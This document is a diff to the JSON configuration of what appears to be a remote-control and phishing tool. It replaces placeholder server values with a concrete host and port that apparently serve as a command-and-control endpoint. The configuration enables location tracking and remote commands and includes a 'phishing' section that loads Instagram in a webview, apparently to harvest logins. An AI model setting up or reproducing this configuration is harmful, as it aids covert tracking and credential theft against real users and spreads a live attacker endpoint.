@@ -1,6 +1,6 @@
 {
-  "api_url": "http://YOUR_VPS_IP:3000",
-  "ws_url": "ws://YOUR_VPS_IP:3001",
+  "api_url": "http://zanspiwhost.panelpublic.my.id:5013",
+  "ws_url": "ws://zanspiwhost.panelpublic.my.id:5013",
   "version": "2.5",
   "features": {
     "location": true,
@@ -17,8 +17,8 @@
   "command_timeout": 30,
   "server": {
     "host": "YOUR_VPS_IP",
-    "port": 3000,
-    "ws_port": 3001
+    "port": 5013,
+    "ws_port": 5013
   },
   "phishing": {
     "webview_url": "https://www.instagram.com",
